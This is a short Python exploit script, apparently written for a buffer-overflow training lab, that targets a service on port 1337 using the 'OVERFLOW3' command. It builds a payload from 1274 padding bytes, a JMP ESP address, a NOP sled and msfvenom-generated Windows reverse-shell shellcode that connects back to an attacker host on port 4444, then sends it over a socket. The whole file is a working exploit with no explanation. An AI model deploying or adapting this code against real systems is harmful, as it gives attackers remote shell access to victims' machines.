import sys
import socket

host = "10.10.160.110"
port = 1337

#jmp esp addr 62501203
# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.116 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5F\xb8\xee" -f c

shell = ("\xfc\xbb\x89\x6d\x70\xdd\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x75\x85\xf2\xdd\x85"
"\x56\x93\x54\x60\x67\x93\x03\xe1\xd8\x23\x47\xa7\xd4\xc8\x05"
"\x53\x6e\xbc\x81\x54\xc7\x0b\xf4\x5b\xd8\x20\xc4\xfa\x5a\x3b"
"\x19\xdc\x63\xf4\x6c\x1d\xa3\xe9\x9d\x4f\x7c\x65\x33\x7f\x09"
"\x33\x88\xf4\x41\xd5\x88\xe9\x12\xd4\xb9\xbc\x29\x8f\x19\x3f"
"\xfd\xbb\x13\x27\xe2\x86\xea\xdc\xd0\x7d\xed\x34\x29\x7d\x42"
"\x79\x85\x8c\x9a\xbe\x22\x6f\xe9\xb6\x50\x12\xea\x0d\x2a\xc8"
"\x7f\x95\x8c\x9b\xd8\x71\x2c\x4f\xbe\xf2\x22\x24\xb4\x5c\x27"
"\xbb\x19\xd7\x53\x30\x9c\x37\xd2\x02\xbb\x93\xbe\xd1\xa2\x82"
"\x1a\xb7\xdb\xd4\xc4\x68\x7e\x9f\xe9\x7d\xf3\xc2\x65\xb1\x3e"
"\xfc\x75\xdd\x49\x8f\x47\x42\xe2\x07\xe4\x0b\x2c\xd0\x0b\x26"
"\x88\x4e\xf2\xc9\xe9\x47\x31\x9d\xb9\xff\x90\x9e\x51\xff\x1d"
"\x4b\xf5\xaf\xb1\x24\xb6\x1f\x72\x95\x5e\x75\x7d\xca\x7f\x76"
"\x57\x63\x15\x8d\x30\x86\xe3\x8e\xb4\xfe\xf1\x90\x25\xa3\x7c"
"\x76\x2f\x4b\x29\x21\xd8\xf2\x70\xb9\x79\xfa\xae\xc4\xba\x70"
"\x5d\x39\x74\x71\x28\x29\xe1\x71\x67\x13\xa4\x8e\x5d\x3b\x2a"
"\x1c\x3a\xbb\x25\x3d\x95\xec\x62\xf3\xec\x78\x9f\xaa\x46\x9e"
"\x62\x2a\xa0\x1a\xb9\x8f\x2f\xa3\x4c\xab\x0b\xb3\x88\x34\x10"
"\xe7\x44\x63\xce\x51\x23\xdd\xa0\x0b\xfd\xb2\x6a\xdb\x78\xf9"
"\xac\x9d\x84\xd4\x5a\x41\x34\x81\x1a\x7e\xf9\x45\xab\x07\xe7"
"\xf5\x54\xd2\xa3\x16\xb7\xf6\xd9\xbe\x6e\x93\x63\xa3\x90\x4e"
"\xa7\xda\x12\x7a\x58\x19\x0a\x0f\x5d\x65\x8c\xfc\x2f\xf6\x79"
"\x02\x83\xf7\xab\x02\x23\x08\x54")

jmp = "\x03\x12\x50\x62"

buffer = 'OVERFLOW3 ' + 'A'*1274 + jmp + "\x90"*16 + shell + '\x90'*(2000-1274-4-len(shell))


try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	print(s.recv(1024))
	print("sending evil payload ..!")
	s.send(bytes(buffer,"latin-1"))
	print("[+] Done!")

except:
	print("[-] could not connect!")